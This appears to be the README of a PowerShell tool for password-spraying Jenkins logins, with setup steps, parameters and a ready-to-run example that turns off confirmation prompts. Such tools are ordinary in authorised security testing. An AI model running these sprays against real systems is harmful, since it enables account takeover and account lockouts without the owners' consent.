# JenkinsPasswordSpray
JenkinsPasswordSpray is a tool witten in PowerShell to perform password spraying attacks against users of a [Jenkins](https://jenkins.io/) instance. Be careful not to lock out accounts!

## Quick Start Guide
Open a PowerShell terminal from the Windows command line with `powershell.exe -exec bypass` and import the module with `Import-Module JenkinsPasswordSpray.ps1`.

The mandatory parameters are `-URL`, `-Username`/`-UsernameFile` and `-Password`/`-PasswordFile`.

The following command will spray against a list of users and attempt to authenticate using each username and a password from the specified list. If a valid login is found, the script will stop unless `-ContinueOnSuccess` is set to `$True`. A confirmation will be prompted unless the `-Force` parameter is set. The results of the spray will be output to a file called `sprayed-jenkins.txt`

The script will also try to help you clean up your URL if it's invalid or contains trailing elements like `/login`, as this will make the URL invalid for password spraying. But because your target Jenkins instance might be located in a subdirectory, this feature asks for confirmation before trimming the URL.

Type `Get-Help Invoke-JenkinsPasswordSpra` to see the different options.

### Example command

```PowerShell
Invoke-JenkinsPasswordSpray -URL http://jenkins:8080 -UsernameFile .\users.txt -PasswordFile .\pws.txt -ContinueOnSuccesss $true -Force -Outfile .\sprayed-jenkins.txt
